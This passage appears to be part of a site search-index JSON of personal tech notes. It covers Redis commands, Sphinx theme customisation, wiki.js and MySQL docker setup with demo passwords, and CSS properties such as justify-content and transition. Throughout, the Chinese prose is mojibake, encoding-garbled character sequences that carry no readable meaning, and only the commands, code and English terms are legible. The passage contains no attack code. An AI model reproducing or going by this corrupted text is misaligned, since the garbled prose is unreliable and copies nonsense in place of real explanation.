å¯é€‰å‚æ•°ï¼Œåœ¨è®¾ç½®é”®çš„å€¼çš„åŒæ—¶ï¼Œè·å–é”®çš„æ—§å€¼ setnx ä¸setç±»ä¼¼, ä¸è¿‡åªæœ‰åœ¨é”®keyä¸å­˜åœ¨æ—¶æ‰è®¾ç½®. å‘½ä»¤æ¥è‡ªäº SET if Not eXists çš„ç¼©å†™ å‘½ä»¤çš„è¿”å›å€¼: 1ï¼šè®¾ç½®æˆåŠŸï¼› 0ï¼škey æ²¡æœ‰è®¾ç½®æˆåŠŸã€‚ del åˆ é™¤æŒ‡å®šçš„key exists åˆ¤æ–­æŒ‡å®šçš„keyæ˜¯å¦å­˜åœ¨ hincrby åˆ›å»ºæŒ‡å®škeyçš„hashè¡¨ hexists åˆ¤æ–­keyå¯¹åº”çš„hashè¡¨ä¸­æ˜¯å¦å­˜åœ¨æŸä¸ªå€¼ expire æŒ‡å®šæŸä¸ªkeyçš„è¿‡æœŸæ—¶é—´, å•ä½: ç§’ incr è®¾ç½®æŸä¸ªkeyè‡ªå¢, å°±æ˜¯æ¯æ¬¡è®¾ç½®ä¸€æ¬¡åå°±åŠ ä¸€ æ³¨è§£ å¯¹äº \"æŸ¥çœ‹æŒ‡å®škeyæ•°æ®ç±»å‹\", è¡¨ç¤ºkeyå¯¹åº”çš„å€¼çš„æ•°æ®ç±»å‹ Hashæ“ä½œ HMSET hash, æ‰¹é‡å­˜å‚¨ HMGET hash, æ‰¹é‡è·å– Listæ“ä½œ ä¸€è§ˆ LPUSH RPUSH LPOP RPOP LRANGE BLPOP BRPOP å°†ä¸€ä¸ªæˆ–å¤šä¸ªå€¼valueæ’å…¥åˆ°keyåˆ—è¡¨çš„è¡¨å¤´ï¼ˆæœ€å·¦è¾¹ï¼‰: LPUSH key value [value ...] å°†ä¸€ä¸ªæˆ–å¤šä¸ªå€¼valueæ’å…¥åˆ°keyåˆ—è¡¨çš„è¡¨å°¾ï¼ˆæœ€å³è¾¹ï¼‰: RPUSH key value [value ...] ç§»é™¤å¹¶è¿”å›keyåˆ—è¡¨çš„å¤´å…ƒç´ : LPOP key ç§»é™¤å¹¶è¿”å›keyåˆ—è¡¨çš„å°¾å…ƒç´ : RPOP key è¿”å›åˆ—è¡¨keyä¸­æŒ‡å®šåŒºé—´å†…çš„å…ƒç´ ï¼ŒåŒºé—´ä»¥åç§»é‡startå’ŒstopæŒ‡å®š: LRANGE key start stop ä»keyåˆ—è¡¨è¡¨å¤´å¼¹å‡ºä¸€ä¸ªå…ƒç´ ï¼Œè‹¥åˆ—è¡¨ä¸­æ²¡æœ‰å…ƒç´ ï¼Œé˜»å¡ç­‰å¾… timeoutç§’ï¼›å¦‚æœtimeout=0ï¼Œ ç›´é˜»å¡ç­‰å¾…: BLPOP key [key ...] timeout ä»keyåˆ—è¡¨è¡¨å°¾å¼¹å‡ºä¸€ä¸ªå…ƒç´ ï¼Œè‹¥åˆ—è¡¨ä¸­æ²¡æœ‰å…ƒç´ ï¼Œé˜»å¡ç­‰å¾… timeoutç§’ï¼›å¦‚æœtimeout=0ï¼Œä¸€ç›´é˜»å¡ç­‰å¾…: BRPOP key [key ...] timeout å¸¸ç”¨åˆ†å¸ƒå¼æ•°æ®ç»“æ„ æ ˆ: Stack = LPUSH + LPOP é˜Ÿåˆ—: Queue = LPUSH + RPOP é˜»å¡é˜Ÿåˆ—: Blocking MQ = LPUSH + BRPOP Setæ“ä½œ ä¸€è§ˆ SADD SREM SCARD SISMEMBER SRANDMEMBER SPOP å¾€é›†åˆkeyä¸­å­˜å…¥å…ƒç´ ï¼Œå…ƒç´ å­˜åœ¨åˆ™å¿½ç•¥ï¼Œ è‹¥keyä¸å­˜åœ¨åˆ™æ–°å»º: SADD key member [member ...] ä»é›†åˆkeyä¸­åˆ é™¤å…ƒç´ : SREM key member [member ...] è·å–é›†åˆkeyä¸­æ‰€æœ‰å…ƒç´ : SMEMBERS key è·å–é›†åˆkeyçš„å…ƒç´ ä¸ªæ•°: SCARD key åˆ¤æ–­memberå…ƒç´ æ˜¯å¦å­˜åœ¨äºé›†åˆkeyä¸­: SISMEMBER key member ä»é›†åˆkeyä¸­é€‰å‡ºcountä¸ªå…ƒç´ (éšæœºé€‰å–)ï¼Œå…ƒç´ ä¸ä»keyä¸­åˆ é™¤: SRANDMEMBER key [count] ä»é›†åˆkeyä¸­é€‰å‡ºcountä¸ªå…ƒç´ ï¼Œå…ƒç´ ä»keyä¸­åˆ é™¤: SPOP key [count] Setè¿ç®—æ“ä½œ ä¸€è§ˆ SINTER SINTERSTORE SUNION SUNIONSTORE SDIFF SDIFFSTORE äº¤é›†è¿ç®—: SINTER key [key ...] å°†äº¤é›†ç»“æœå­˜å…¥æ–°é›†åˆdestinationä¸­: SINTERSTORE destination key [key ..] å¹¶é›†è¿ç®—: SUNION key [key .] å°†å¹¶é›†ç»“æœå­˜å…¥æ–°é›†åˆdestinationä¸­: SUNIONSTORE destination key [key ...] å·®é›†è¿ç®—: SDIFF key [key ...] å°†å·®é›†ç»“æœå­˜å…¥æ–°é›†åˆdestinationä¸­: SDIFFSTORE destination key [key ...] ZSetå¸¸ç”¨æ“ä½œ ä¸€è§ˆ ZADD ZREM ZSCORE ZINCRBY ZCARD ZRANGE ZREVRANGE ä¸Setçš„åŒºåˆ«å°±æ˜¯, å…ƒç´ æ’å…¥çš„æ—¶å€™è¦æä¾›ä¸€ä¸ª åˆ†å€¼ å¾€æœ‰åºé›†åˆkeyä¸­åŠ å…¥å¸¦åˆ†å€¼å…ƒç´ : ZADD key score member [[score member]...] ä»æœ‰åºé›†åˆkeyä¸­åˆ é™¤å…ƒç´ : ZREM key member [member ...] è¿”å›æœ‰åºé›†åˆkeyä¸­å…ƒç´ memberçš„åˆ†å€¼: ZSCORE key member ä¸ºæœ‰åºé›†åˆkeyä¸­å…ƒç´ memberçš„åˆ†å€¼åŠ ä¸Šincrement: ZINCRBY key increment member è¿”å›æœ‰åºé›†åˆkeyä¸­å…ƒç´ ä¸ªæ•°: ZCARD key æ­£åºè·å–æœ‰åºé›†åˆkeyä»startä¸‹æ ‡åˆ°stopä¸‹æ ‡çš„å…ƒç´ : ZRANGE key start stop [WITHSCORES] å€’åºè·å–æœ‰åºé›†åˆkeyä»startä¸‹æ ‡åˆ°stopä¸‹æ ‡çš„å…ƒç´ : ZREVRANGE key start stop [WITHSCORES] Zseté›†åˆæ“ä½œ ä¸€è§ˆ ZUNIONSTORE ZINTERSTORE å¹¶é›†è®¡ç®—: ZUNIONSTORE destkey numkeys key [key ...] äº¤é›†è®¡ç®—: ZINTERSTORE destkey numkeys key [key ...]","tags":"æ•°æ®åº“","url":"/yq-doc-source-docs-database-redis-use.html","loc":"/yq-doc-source-docs-database-redis-use.html"},{"title":"rstä¸»é¢˜","text":"å‚è€ƒå®˜æ–¹æ–‡æ¡£: https://www.sphinx-doc.org/en/master/usage/theming.html","tags":"æ–‡æ¡£","url":"/yq-doc-source-docs-document-RST-mark-language-About-the-topic.html","loc":"/yq-doc-source-docs-document-RST-mark-language-About-the-topic.html"},{"title":"æ‚ä¹±æ— ç« ","text":"é€‰é¡¹è¯´æ˜ -a command-line option \"a\" -1 file , --one= file , --two file Multiple options with arguments. code Here is a literal block: if literal_block: text = 'is left as-is' spaces_and_linebreaks = 'are preserved' markup_processing = None Data Dict cat: str cat dog: str dog name: str name ç±»ä¼¼å­—å…¸è¯´æ˜ cat: str cat dog: str dog name: str name å¼•æ–‡ Take it away, Eric the Orchestra Leader! A one, two, a one two three four Half a bee, philosophically, must, ipso facto , half not be. But half the bee has got to be, vis a vis its entity. D'you see? Singing...","tags":"æ–‡æ¡£","url":"/yq-doc-source-docs-document-RST-mark-language-Chaotic.html","loc":"/yq-doc-source-docs-document-RST-mark-language-Chaotic.html"},{"title":"docæ–‡æ¡£è½¬æ¢ä¸ºrst","text":"å¯ä»¥ä½¿ç”¨pandoc, å…·æœ‰è·¨å¹³å°çš„æ”¯æŒ, å¯å‚è€ƒ: /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/pandoc æ³¨æ„, docä¸èƒ½ç›´æ¥è½¬æ¢ä¸ºrstæ–‡æ¡£. éœ€è¦å…ˆè½¬æ¢ä¸ºdocxæ ¼å¼(ç›´æ¥ç”¨word/wpsæ‰“å¼€å¦å­˜ä¸ºdocxæ ¼å¼å³å¯)","tags":"æ–‡æ¡£","url":"/yq-doc-source-docs-document-RST-mark-language-DOC-document-convert-to-RST.html","loc":"/yq-doc-source-docs-document-RST-mark-language-DOC-document-convert-to-RST.html"},{"title":"sphinxè‡ªå®šä¹‰ä¸»é¢˜","text":"æ—¥æœŸ: 2023.02.24 å‘¨äº” å‚è€ƒ: ä¸»é¢˜å¼€å‘ ä¸»é¢˜ç›®å½•å¤§æ¦‚ç»“æ„: . â”œâ”€â”€ __init__.py â”œâ”€â”€ breadcrumbs.html â”œâ”€â”€ footer.html â”œâ”€â”€ layout.html â”œâ”€â”€ search.html â”œâ”€â”€ searchbox.html ä»¥ä¸Šå‡ ä¸ªhtmlæ–‡ä»¶éƒ½æ˜¯htmlæ¨¡ç‰ˆ â”œâ”€â”€ static é™æ€èµ„æºè·¯å¾„ â””â”€â”€ theme.conf ä¸»é¢˜é…ç½®, inié…ç½®å½¢å¼ theme.conf é…ç½® inherit: ç»§æ‰¿å“ªä¸ªä¸»é¢˜, ä¸»è¦ç”¨äºæŸ¥æ‰¾ç¼ºå¤±çš„æ¨¡ç‰ˆ stylesheet: main CSS name pygments_style: å¾…è¡¥å…… sidebars: æä¾›äº†ç”¨é€—å·åˆ†éš”çš„ä¾§è¾¹æ æ¨¡æ¿åˆ—è¡¨ï¼Œç”¨äºæ„é€ æè¦æ ã€‚å¯ä»¥é…ç½® html_sidebars è¦†ç›–æ­¤å€¼. [options] æ¨¡å—ç”¨äºé…ç½®å˜é‡çš„å€¼, æ­¤å¤„è®¾ç½®çš„å€¼å¯ä»¥è¢« config.py å®šä¹‰çš„ html_theme_options è¦†ç›–. å¦‚: [theme] inherit = base theme stylesheet = main CSS name pygments_style = stylename sidebars = localtoc.html, relations.html, sourcelink.html, searchbox.html [options] variable = default value é…ç½®é™æ€èµ„æº é»˜è®¤æƒ…å†µä¸‹, static ç›®å½•ä¸‹çš„æ–‡ä»¶ä¼šè¢«å¤åˆ¶åˆ° _static è‹¥éœ€è¦ä½¿ç”¨å…¶ä»–ç›®å½•ä¸‹çš„æ–‡ä»¶, å¯å‚è€ƒæ­¤æ–¹æ³•: from os import path from sphinx.util.fileutil import copy_asset_file def copy_custom_files(app, exc): if app.builder.format == 'html' and not exc: staticdir = path.join(app.builder.outdir, '_static') copy_asset_file('path/to/myextension/_static/myjsfile.js', staticdir) def setup(app): app.connect('build-finished', copy_custom_files) æ¨¡ç‰ˆä½¿ç”¨è‡ªå®šä¹‰å‡½æ•° ä¾‹, å®šä¹‰å‡½æ•°: # æ³¨å†Œæ–¹æ³• def setup_my_func(app, pagename, templatename, context, doctree): # æ¨¡ç‰ˆä½¿ç”¨çš„æ–¹æ³• def my_func(mystring): return \"Your string is %s\" % mystring # æ³¨å†Œåˆ°ä¸Šä¸‹æ–‡ context['my_func'] = my_func # é…ç½® def setup(app): app.connect(\"html-page-context\", setup_my_func) åœ¨æ¨¡ç‰ˆä¸­ä½¿ç”¨: <div> {{ my_func(\"some string\") }} </div> åŸºäºé…ç½®çš„jsè„šæœ¬ æ–¹æ¡ˆä¸€, ä½¿ç”¨js_tæ¨¡ç‰ˆ åœ¨ static ç›®å½•ä¸‹é…ç½®jsæ¨¡ç‰ˆ(ä»¥ js_t ä¸ºåç¼€çš„æ–‡ä»¶), æ­¤æ–‡ä»¶æœ€åå°†ä¼šè½¬æ¢ä¸º _static ç›®å½•ä¸‹å»æ‰ _t åçš„jsæ–‡ä»¶ å¦‚: project/static/test.js_t -> project/_buid/html/_static/test.js æ³¨è§£ æœ¬æ¥å°±æ˜¯jsæ–‡ä»¶çš„ä¼šåŸæ ·å¤åˆ¶ æ–¹æ¡ˆäºŒ, ä½¿ç”¨pythonå‡½æ•°é…ç½® ä½¿ç”¨ Sphinx.add_js_file() , éœ€è¦å…ˆåœ¨ config.py é…ç½®å˜é‡ å¦‚, åœ¨ config é…ç½®äº†å˜é‡ my_javascript_variable, ä½¿ç”¨ä»¥ä¸‹æ–¹å¼æ³¨å…¥ # è¯»å–å˜é‡æ’å…¥åˆ°jsæ–‡ä»¶ def add_js_variable(app): # This is a configuration that you've specified for users in `conf.py` js_variable = app.config['my_javascript_variable'] js_text = \"var my_variable = '%s';\" % js_variable app.add_js_file(None, body=js_text) # builderåˆå§‹åŒ–å æ‰§è¡Œæ­¤æ–¹æ³• def setup(app): # æ³¨å…¥é…ç½®å˜é‡ app.add_config_value('my_javascript_variable', 0, 'html') # Run the function after the builder is initialized app.connect('builder-inited', add_js_variable) æ³¨è§£ å¦‚æœè‡ªå®šä¹‰çš„jsæ–‡ä»¶æŠ¥é”™å¯èƒ½ä¼šä½¿ç”¨åŸºç¡€æ¨¡ç‰ˆçš„js","tags":"æ–‡æ¡£","url":"/yq-doc-source-docs-document-RST-mark-language-Sphinx-custom-theme.html","loc":"/yq-doc-source-docs-document-RST-mark-language-Sphinx-custom-theme.html"},{"title":"doc -> rst","text":"å‚è€ƒ å‚è€ƒ[é‡ç«]sphinxæ–‡æ¡£docxtorst","tags":"æ–‡æ¡£","url":"/yq-doc-source-docs-document-RST-mark-language-docx-file-conversion-RST.html","loc":"/yq-doc-source-docs-document-RST-mark-language-docx-file-conversion-RST.html"},{"title":"wiki","text":"ç›®å‰æ˜¯ç›´æ¥ä½¿ç”¨çš„sphinx, å†™rstæ–‡æ¡£, ç„¶åé€šè¿‡buildç¼–è¯‘ç§°html. æ„Ÿè§‰å·®ç‚¹æ„æ€, äºæ˜¯æ‰¾äº†ä¸€ä¸‹æœ‰å“ªäº›å¼€æºçš„wikiå®ç°. wiki.js éƒ¨ç½²: docker run -d -p 8080:3000 --name wiki --restart unless-stopped -e \"DB_TYPE=mysql\" -e \"DB_HOST=db\" -e \"DB_PORT=3306\" -e \"DB_USER=yanque\" -e \"DB_PASS=wikijsrocks_yanque\" -e \"DB_NAME=yanque_wiki\" ghcr.io/requarks/wiki:2","tags":"æ–‡æ¡£","url":"/yq-doc-source-docs-document-wiki-wiki.html","loc":"/yq-doc-source-docs-document-wiki-wiki.html"},{"title":"wiki.js","text":"ä¸€ä¸ªå¼€æºçš„ wiki æ¡†æ¶, æ”¯æŒæ•°æ®åº“... å®˜ç½‘/gitthub:: docs-wiki.js github-wiki.js æœ¬åœ°dockeréƒ¨ç½² éƒ¨ç½²mysql, å¯å‚è€ƒ /docs/å®¹å™¨ä¸é›†ç¾¤/docker/docker_store/mysql docker run -d --name mymysql -p 3306:3306 -e MYSQL_ROOT_PASSWORD=root -e MYSQL_USER=yanque_wiki -e MYSQL_PASSWORD=yanque_wiki -e MYSQL_DATABASE=yanque_wiki mysql éƒ¨ç½²wiki.js: docker run -d -p 8080:3000 --name wiki --restart unless-stopped -e \"DB_TYPE=mysql\" -e \"DB_HOST=172.17.0.1\" -e \"DB_PORT=3306\" -e \"DB_USER=yanque_wiki\" -e \"DB_PASS=yanque_wiki\" -e \"DB_NAME=yanque_wiki\" ghcr.io/requarks/wiki æ³¨æ„: è¿™é‡Œçš„ DB_HOST , ä¸€å¼€å§‹åªæƒ³ç€æ•°æ®åº“å·²ç»æ˜ å°„åˆ°æœ¬åœ°, è„‘å­æŠ½äº†å†™äº†ä¸ª 127.0.0.1 , ä¸€ç›´è¿ä¸ä¸Šæ•°æ®åº“. å¦‚æœè¦è®¾ç½®ä¸­æ–‡, ä¸è¦ä½¿ç”¨å®˜ç½‘æ–‡æ¡£å»ºè®®çš„2çš„tag(2åªæœ‰è‹±æ–‡), ä½¿ç”¨æœ€æ–°çš„. å¾…è¡¥å……...","tags":"æ–‡æ¡£","url":"/yq-doc-source-docs-document-wiki-wiki.js.html","loc":"/yq-doc-source-docs-document-wiki-wiki.js.html"},{"title":"navigator","text":"navigator æ˜¯ä¸€ä¸ª JavaScript ä¸­çš„å†…ç½®å¯¹è±¡ï¼Œæä¾›äº†ä¸æµè§ˆå™¨ç›¸å…³çš„ä¿¡æ¯å’ŒåŠŸèƒ½ã€‚ å®ƒæ˜¯ window å¯¹è±¡çš„ä¸€ä¸ªå±æ€§ï¼Œå¯ä»¥é€šè¿‡ window.navigator æˆ–è€…ç›´æ¥ä½¿ç”¨ navigator è®¿é—®ã€‚ navigator å¯¹è±¡åŒ…å«äº†è®¸å¤šå±æ€§å’Œæ–¹æ³•ï¼Œç”¨äºè·å–å’Œæ“ä½œä¸æµè§ˆå™¨ç¯å¢ƒç›¸å…³çš„ä¿¡æ¯ã€‚ ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸ç”¨çš„ navigator å±æ€§å’Œæ–¹æ³•ï¼š navigator.userAgent è¿”å›ä¸€ä¸ªåŒ…å«ç”¨æˆ·ä»£ç†å­—ç¬¦ä¸²çš„å­—ç¬¦ä¸²ï¼Œå…¶ä¸­åŒ…å«äº†æµè§ˆå™¨çš„ç›¸å…³ä¿¡æ¯ï¼ˆå¦‚æµè§ˆå™¨åç§°ã€ç‰ˆæœ¬å·ã€æ“ä½œç³»ç»Ÿç­‰ï¼‰ã€‚ navigator.platform è¿”å›ä¸€ä¸ªè¡¨ç¤ºç”¨æˆ·æ“ä½œç³»ç»Ÿå¹³å°çš„å­—ç¬¦ä¸²ï¼ˆå¦‚ \"Win32\"ã€\"Linux\" ç­‰ï¼‰ã€‚ navigator.language è¿”å›ä¸€ä¸ªè¡¨ç¤ºç”¨æˆ·é¦–é€‰è¯­è¨€çš„å­—ç¬¦ä¸²ï¼Œä¾‹å¦‚ \"en-US\" è¡¨ç¤ºè‹±è¯­ï¼ˆç¾å›½ï¼‰ã€‚ navigator.geolocation æä¾›äº†è·å–ç”¨æˆ·åœ°ç†ä½ç½®ä¿¡æ¯çš„åŠŸèƒ½ï¼ŒåŒ…æ‹¬ç»åº¦ã€çº¬åº¦ç­‰ã€‚ navigator.cookieEnabled è¡¨ç¤ºæµè§ˆå™¨æ˜¯å¦å¯ç”¨äº† Cookieã€‚ navigator.onLine è¡¨ç¤ºæµè§ˆå™¨å½“å‰æ˜¯å¦å¤„äºåœ¨çº¿çŠ¶æ€ã€‚ navigator.plugins è¿”å›ä¸€ä¸ªåŒ…å«æµè§ˆå™¨å·²å®‰è£…æ’ä»¶çš„æ•°ç»„ã€‚","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-Built--in-function-navigator.html","loc":"/yq-doc-source-docs-front-end-Built--in-function-navigator.html"},{"title":"content","text":"æ³¨è§£ æºäºAI åœ¨ CSS ä¸­ï¼Œcontent å±æ€§ç”¨äºåœ¨ä¼ªå…ƒç´ ï¼ˆ:before å’Œ :afterï¼‰ä¸­æ’å…¥ç”Ÿæˆçš„å†…å®¹ã€‚å®ƒæ˜¯ä¸€ä¸ªç”¨äºç”Ÿæˆå†…å®¹çš„å†…è”å±æ€§ã€‚ é€šè¿‡ä½¿ç”¨ content å±æ€§ï¼Œæ‚¨å¯ä»¥åœ¨ä¼ªå…ƒç´ ä¸­æ’å…¥æ–‡æœ¬ã€å›¾æ ‡ã€è®¡æ•°å™¨æˆ–å…¶ä»–ç”Ÿæˆçš„å†…å®¹ï¼Œä»è€Œæ”¹å˜æˆ–å¢å¼ºæ–‡æ¡£çš„å‘ˆç°ã€‚ ä¸‹é¢æ˜¯ä¸€ä¸ªç¤ºä¾‹ï¼Œæ¼”ç¤ºå¦‚ä½•ä½¿ç”¨ content å±æ€§åœ¨ä¼ªå…ƒç´ ä¸­æ’å…¥æ–‡æœ¬å†…å®¹: .element::before { content: \"å‰ç¼€ï¼š\"; } .element::after { content: \"ï¼ˆåç¼€ï¼‰\"; } åœ¨ä¸Šè¿°ç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬åœ¨ .element å…ƒç´ çš„ ::before ä¼ªå…ƒç´ ä¸­æ’å…¥äº†æ–‡æœ¬ \"å‰ç¼€ï¼š\"ï¼Œ åœ¨ ::after ä¼ªå…ƒç´ ä¸­æ’å…¥äº†æ–‡æœ¬ \"ï¼ˆåç¼€ï¼‰\"ã€‚ è¿™æ ·ï¼Œæ¯ä¸ª .element å…ƒç´ éƒ½ä¼šåœ¨å…¶å†…å®¹ä¹‹å‰å’Œä¹‹åæ˜¾ç¤ºç›¸åº”çš„æ–‡æœ¬ã€‚ content å±æ€§å¯ä»¥æ¥å—ä¸åŒç±»å‹çš„å€¼ï¼ŒåŒ…æ‹¬å­—ç¬¦ä¸²ã€URLã€è®¡æ•°å™¨ç­‰ã€‚ æ‚¨å¯ä»¥ä½¿ç”¨å¼•å·å°†å­—ç¬¦ä¸²æ‹¬èµ·æ¥ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ CSS å‡½æ•°ã€å˜é‡æˆ–å…¶ä»– CSS å€¼ã€‚ æ­¤å¤–ï¼Œcontent å±æ€§è¿˜å¯ä»¥ä¸å…¶ä»– CSS å±æ€§ä¸€èµ·ä½¿ç”¨ï¼Œ ä¾‹å¦‚ displayã€positionã€background ç­‰ï¼Œä»¥æ§åˆ¶ä¼ªå…ƒç´ çš„æ˜¾ç¤ºå’Œæ ·å¼ã€‚ é‡è¦ content å±æ€§ä»…é€‚ç”¨äºä¼ªå…ƒç´ ï¼ˆ:before å’Œ :afterï¼‰ï¼Œä¸èƒ½ç›´æ¥ç”¨äºçœŸå®çš„ HTML å…ƒç´ ã€‚","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-Content.html","loc":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-Content.html"},{"title":"float","text":"å®šä¹‰å…ƒç´ åœ¨å“ªä¸ªæ–¹å‘æµ®åŠ¨ å¦‚, leftï¼ˆå…ƒç´ å‘å·¦æµ®åŠ¨ï¼‰ã€rightï¼ˆå…ƒç´ å‘å³æµ®åŠ¨ï¼‰","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-Float.html","loc":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-Float.html"},{"title":"justify-content","text":"è®¾ç½® Flexbox å¸ƒå±€å…ƒç´ åœ¨å®¹å™¨ä¸»è½´å’Œäº¤å‰è½´ä¸Šçš„å¯¹é½æ–¹å¼ justify-content å±æ€§ç”¨äºè®¾ç½®å…ƒç´ åœ¨å®¹å™¨çš„ä¸»è½´ï¼ˆæ°´å¹³è½´ï¼‰ä¸Šçš„å¯¹é½æ–¹å¼ã€‚ å®ƒé€‚ç”¨äºä½¿ç”¨ Flexbox å¸ƒå±€æˆ– CSS Grid å¸ƒå±€çš„å®¹å™¨ã€‚ å½“ä½ å°†ä¸€ä¸ªå…ƒç´ çš„ /docs/å‰ç«¯/css/csså¸¸ç”¨å±æ€§/display å±æ€§è®¾ç½®ä¸º flex æˆ– inline-flex æ—¶ï¼Œ è¯¥å…ƒç´ æˆä¸ºä¸€ä¸ª flex å®¹å™¨ï¼Œå®ƒçš„å­å…ƒç´ æˆä¸º flex é¡¹ç›®ã€‚ å¸¸è§çš„å€¼åŒ…æ‹¬ï¼š flex-start: å°† flex é¡¹ç›®é ä¸»è½´èµ·å§‹ä½ç½®å¯¹é½ï¼ˆé»˜è®¤å€¼ï¼Œå·¦å¯¹é½ï¼‰ã€‚ flex-end: å°† flex é¡¹ç›®é ä¸»è½´æœ«å°¾ä½ç½®å¯¹é½ï¼ˆå³å¯¹é½ï¼‰ã€‚ center: å°† flex é¡¹ç›®åœ¨ä¸»è½´ä¸Šå±…ä¸­å¯¹é½ï¼ˆå±…ä¸­å¯¹é½ï¼‰ã€‚ space-between: å°† flex é¡¹ç›®å‡åŒ€åˆ†å¸ƒåœ¨ä¸»è½´ä¸Šï¼Œé¦–ä¸ªé¡¹ç›®é èµ·å§‹ä½ç½®ï¼Œæœ«å°¾é¡¹ç›®é æœ«å°¾ä½ç½®ï¼ˆä¸¤ç«¯å¯¹é½ï¼Œé¡¹ç›®ä¹‹é—´å¹³å‡åˆ†å¸ƒï¼‰ã€‚ space-around: å°† flex é¡¹ç›®å‡åŒ€åˆ†å¸ƒåœ¨ä¸»è½´ä¸Šï¼Œé¡¹ç›®ä¹‹é—´å’Œé¦–æœ«é¡¹ç›®ä¸å®¹å™¨è¾¹ç•Œä¹‹é—´çš„é—´è·ç›¸ç­‰ï¼ˆé¡¹ç›®å‘¨å›´å¹³å‡åˆ†å¸ƒï¼‰ã€‚ space-evenly: å°† flex é¡¹ç›®å‡åŒ€åˆ†å¸ƒåœ¨ä¸»è½´ä¸Šï¼ŒåŒ…æ‹¬é¦–æœ«é¡¹ç›®ä¸å®¹å™¨è¾¹ç•Œä¹‹é—´çš„é—´è·éƒ½ç›¸ç­‰ã€‚ ç¤ºä¾‹: .flex-container { display: flex; justify-content: center; } å°† justify-content è®¾ç½®ä¸º center , flex å®¹å™¨å†…çš„é¡¹ç›®å°†åœ¨ä¸»è½´ä¸Šå±…ä¸­å¯¹é½ã€‚","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-Justify-confnt.html","loc":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-Justify-confnt.html"},{"title":"place-content","text":"è®¾ç½® Grid å¸ƒå±€å…ƒç´ åœ¨å®¹å™¨ä¸­çš„æ°´å¹³å’Œå‚ç›´å¯¹é½æ–¹å¼ place-content å±æ€§æ˜¯ CSS Grid å¸ƒå±€çš„ä¸€ä¸ªç®€å†™å±æ€§ï¼Œ ç”¨äºåŒæ—¶è®¾ç½®å…ƒç´ åœ¨å®¹å™¨ä¸­çš„æ°´å¹³å’Œå‚ç›´æ–¹å‘ä¸Šçš„å¯¹é½æ–¹å¼ã€‚ å®ƒæ¥å—ä¸¤ä¸ªå€¼ï¼Œ ç¬¬ä¸€ä¸ªå€¼è¡¨ç¤ºæ°´å¹³å¯¹é½æ–¹å¼ ç¬¬äºŒä¸ªå€¼è¡¨ç¤ºå‚ç›´å¯¹é½æ–¹å¼ã€‚ ä¾‹å¦‚ï¼š place-content: center center; è¡¨ç¤ºåœ¨å®¹å™¨ä¸­æ°´å¹³å’Œå‚ç›´æ–¹å‘ä¸Šå±…ä¸­å¯¹é½ã€‚","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-Place-Content.html","loc":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-Place-Content.html"},{"title":"transition","text":"transition æ˜¯ CSS çš„å±æ€§ï¼Œ ç”¨äºå®šä¹‰å…ƒç´ åœ¨çŠ¶æ€æ”¹å˜æ—¶çš„è¿‡æ¸¡æ•ˆæœã€‚ é€šè¿‡è®¾ç½® transition å±æ€§ï¼Œä½ å¯ä»¥æŒ‡å®šåœ¨å…ƒç´ å±æ€§å‘ç”Ÿå˜åŒ–æ—¶åº”ç”¨çš„è¿‡æ¸¡æ•ˆæœï¼Œ åŒ…æ‹¬è¿‡æ¸¡æ—¶é—´ã€è¿‡æ¸¡ç±»å‹å’Œç¼“åŠ¨å‡½æ•°ç­‰ã€‚ è®¾ç½®å…ƒç´ çš„è¿‡æ¸¡å±æ€§ã€è¿‡æ¸¡æ—¶é—´ã€è¿‡æ¸¡ç±»å‹å’Œå»¶è¿Ÿæ—¶é—´: transition: property duration timing-function delay;","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-Transition.html","loc":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-Transition.html"},{"title":"align-items","text":"è®¾ç½® Flexbox å¸ƒå±€å…ƒç´ åœ¨å®¹å™¨ä¸»è½´å’Œäº¤å‰è½´ä¸Šçš„å¯¹é½æ–¹å¼ align-items å±æ€§ç”¨äºè®¾ç½®å…ƒç´ åœ¨å®¹å™¨çš„äº¤å‰è½´ï¼ˆå‚ç›´è½´ï¼‰ä¸Šçš„å¯¹é½æ–¹å¼ã€‚ å®ƒé€‚ç”¨äºä½¿ç”¨ Flexbox å¸ƒå±€æˆ– CSS Grid å¸ƒå±€çš„å®¹å™¨ã€‚ å¸¸è§çš„å€¼åŒ…æ‹¬ flex-startï¼ˆé»˜è®¤å€¼ï¼Œé¡¶éƒ¨å¯¹é½ï¼‰ã€flex-endï¼ˆåº•éƒ¨å¯¹é½ï¼‰ã€ centerï¼ˆå±…ä¸­å¯¹é½ï¼‰ã€baselineï¼ˆåŸºçº¿å¯¹é½ï¼Œå…ƒç´ çš„åŸºçº¿å¯¹é½ï¼‰ç­‰ã€‚","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-align-items.html","loc":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-align-items.html"},{"title":"background","text":"backgroundå±æ€§æ˜¯ä¸€ä¸ªå¤åˆå±æ€§ï¼Œå®ƒç”¨äºè®¾ç½®å…ƒç´ çš„èƒŒæ™¯æ ·å¼ï¼Œ åŒ…æ‹¬èƒŒæ™¯é¢œè‰²ã€èƒŒæ™¯å›¾ç‰‡ã€èƒŒæ™¯é‡å¤æ–¹å¼ã€èƒŒæ™¯ä½ç½®ç­‰ã€‚ ä½ å¯ä»¥é€šè¿‡æŒ‡å®šå¤šä¸ªå€¼æ¥è®¾ç½®ä¸åŒçš„èƒŒæ™¯å±æ€§ï¼Œä¾‹å¦‚: background: red url(\"image.jpg\") no-repeat center; ä¸Šè¿°ä»£ç 